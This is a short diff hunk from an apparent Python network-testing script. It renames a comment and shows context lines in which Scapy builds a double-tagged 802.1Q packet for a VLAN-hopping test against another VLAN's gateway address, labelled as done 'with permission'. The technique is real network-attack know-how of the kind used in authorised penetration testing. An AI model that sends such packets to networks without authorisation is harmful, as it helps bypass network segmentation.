@@ -22,7 +22,7 @@ def vlan_hopping_test_linux(vlan_id1, vlan_id2):
     print(f"Double Tagging Test (VLAN {vlan_id1} -> VLAN {vlan_id2}):")
     subprocess.run(['ping', '-I', f'192.168.{vlan_id1}.1', '-c', '4'])
 
-    # Example Exploitation (with permission)
+    # Exploitation (with permission)
     print("Exploitation Example:")
     from scapy.all import *
     pkt = Ether()/Dot1Q(vlan=vlan_id1)/Dot1Q(vlan=vlan_id2)/IP(dst=f"192.168.{vlan_id2}.1")/ICMP()
